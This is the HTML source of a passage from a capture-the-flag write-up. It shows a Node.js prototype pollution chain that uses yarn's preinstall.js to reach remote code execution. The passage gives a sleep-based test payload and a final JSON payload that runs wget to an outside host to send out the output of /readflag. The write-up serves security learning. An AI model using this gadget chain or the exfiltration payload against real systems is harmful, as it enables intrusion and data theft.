                binTarget <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readlinkSync</span><span class="token punctuation">(</span>binPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>binTarget<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'../lib/node_modules/corepack/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    fs<span class="token punctuation">.</span><span class="token function">unlinkSync</span><span class="token punctuation">(</span>binPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// ignore errors</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre></div>
<p>There are two very promising variables here, <code class="language-text">process.env.npm_config_global</code>, and <code class="language-text">process.env.npm_execpath</code>.</p>
<p>Polluting <code class="language-text">npm_config_global</code> will cause the conditional statement to pass, which allows us to reach the <code class="language-text">execFileSync()</code> call.</p>
<p>Our gadget is here:</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> targetPath <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">execFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>execPath<span class="token punctuation">,</span> <span class="token punctuation">[</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>npm_execpath<span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">,</span> <span class="token string">'-g'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">encoding</span><span class="token operator">:</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">stdio</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'ignore'</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token string">'ignore'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>We are unable to control <code class="language-text">process.execPath</code>, as it will always be the path of the node executable (<code class="language-text">/usr/local/bin/node</code> in this case). However, we do have control over the first argument via the <code class="language-text">process.env.npm_execpath</code> variable. The resulting command will look like <code class="language-text">/usr/local/bin/node &lt;OUR_INPUT> bin -g</code>.</p>
<p>With control over the first argument, we can load any file on the system. We could already do this before, but this time it is within an <code class="language-text">execFileSync()</code> call, meaning we can additionally pollute the environment. With a polluted environment, we can load <code class="language-text">/proc/self/environ</code> to execute arbitrary code.</p>
<p>We can verify this works with the following, which will cause a 10 second sleep in the execution:</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>npm_config_global <span class="token operator">=</span> <span class="token number">1</span>
<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>npm_execpath <span class="token operator">=</span> <span class="token string">"/proc/self/environ"</span>
<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string-property property">"AAA"</span><span class="token operator">:</span> <span class="token string">"require('child_process').execSync('sleep 10');//"</span><span class="token punctuation">}</span>

<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'/opt/yarn-v1.22.19/preinstall.js'</span><span class="token punctuation">)</span></code></pre></div>
<h1 id="finishing-up" style="position:relative;"><a href="#finishing-up" aria-label="finishing up permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Finishing Up</h1>
<p>Putting everything together, we achieve the following payload:</p>
<p>(note: I’m not sure why yet, but <code class="language-text">toString</code> needs to be at the end or else it doesn’t work properly)</p>
<div class="gatsby-highlight" data-language="json"><pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"%d"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"./usage"</span><span class="token punctuation">,</span>
      <span class="token property">"exports"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"."</span><span class="token operator">:</span> <span class="token string">"./preinstall.js"</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/opt/yarn-v1.22.19"</span><span class="token punctuation">,</span>
    <span class="token property">"npm_config_global"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token property">"npm_execpath"</span><span class="token operator">:</span> <span class="token string">"--require=/proc/self/environ"</span><span class="token punctuation">,</span>
    <span class="token property">"env"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token property">"AAA"</span><span class="token operator">:</span> <span class="token string">"require('child_process').execSync('wget$IFS\"\"http://downgrade.ml:4444/$IFS\"\"-U$IFS\"\"`/readflag`');//"</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token property">"toString"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
<span class="token punctuation">}</span></code></pre></div>
<p>After sending the final payload to the server, we receive the flag.</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 484px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/c68b85aafee39e2a710db3c768d8baaa/ff42b/win.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 35.44303797468354%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABKUlEQVQY012Q126DQBRE/SXBtC3UrcBWYCmOgxwp//8zEXYeIkujq3mYc0eaC2GGS8uE1XbhwgrpAKIAM4gpxLSoJCp4UQlcCohZktX/ddF2c37n0oXl8OOuzCKkl90Y1qOlSkjfUk25oczgUrzDsp8HNROmlV78uGu7ym6U3XiafmTcAkiiuPyIUJxW77Cyq/XboOdt/3b+1qvZuM24dTCLG2/r/pjDnQvLuM0hSbI6zZs0b/7gbpi49ExYP50kKjgqOS74K5SB9nkbgEicVlFcRnF5TcprUsVpdTa78RaWY9keU7h/fv1M4T4vh+zOj5SfnUzYuh1aqrh0ovNcurrty1peGqp6NfcqMG7qph90QJhlkEDMAKYA0dfsOSQAkadnELMckhy0v3ckUtfmPGGyAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="flag"
        title="flag"
        src="/static/c68b85aafee39e2a710db3c768d8baaa/ff42b/win.png"
        srcset="/static/c68b85aafee39e2a710db3c768d8baaa/c26ae/win.png 158w,
/static/c68b85aafee39e2a710db3c768d8baaa/6bdcf/win.png 315w,
/static/c68b85aafee39e2a710db3c768d8baaa/ff42b/win.png 484w"
        sizes="(max-width: 484px) 100vw, 484px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
  </a>
    </span></p>
<p>We used prototype pollution to achieve LFI, which then used more prototype pollution to achieve another LFI, which used prototype pollution again for RCE. This was a really cool chain which showcases the extremely high impact prototype pollution can have. I think there is still a ton of room for research into the subject, and am looking forward to seeing what the future holds for prototype pollution. Also, this challenge gave me some very fun ideas for the next idekCTF :^)</p></section><hr/><footer></footer></article><nav class="blog-post-nav"><ul style="display:flex;flex-wrap:wrap;justify-content:space-between;list-style:none;padding:0"></ul></nav></main><footer>© <!-- -->2022<!-- -->, Built with<!-- --> <!-- --><a href="https://www.gatsbyjs.com">Gatsby</a></footer></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/Balsn-CTF-2022-2linenodejs/";window.___webpackCompilationHash="5bc8b6ad2eb64f6466ef";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-67664a8ccc6c9f02b880.js"],"app":["/app-8c998b3cc3dba440ac4a.js"],"component---src-pages-404-js":["/component---src-pages-404-js-2325086e664690bad014.js"],"component---src-pages-about-js":["/component---src-pages-about-js-d8e55aadf821b4e98f83.js"],"component---src-pages-index-js":["/component---src-pages-index-js-291c53b1cf947ccd3574.js"],"component---src-pages-using-typescript-tsx":["/component---src-pages-using-typescript-tsx-10c44cecea137ee2685b.js"],"component---src-templates-blog-post-js":["/component---src-templates-blog-post-js-83735933c71ed5d93d45.js"]};/*]]>*/</script><script src="/polyfill-67664a8ccc6c9f02b880.js" nomodule=""></script><script src="/app-8c998b3cc3dba440ac4a.js" async=""></script><script src="/framework-a90df563a3fe4f48300d.js" async=""></script><script src="/webpack-runtime-86fe8976abb0e05e6f38.js" async=""></script></body></html>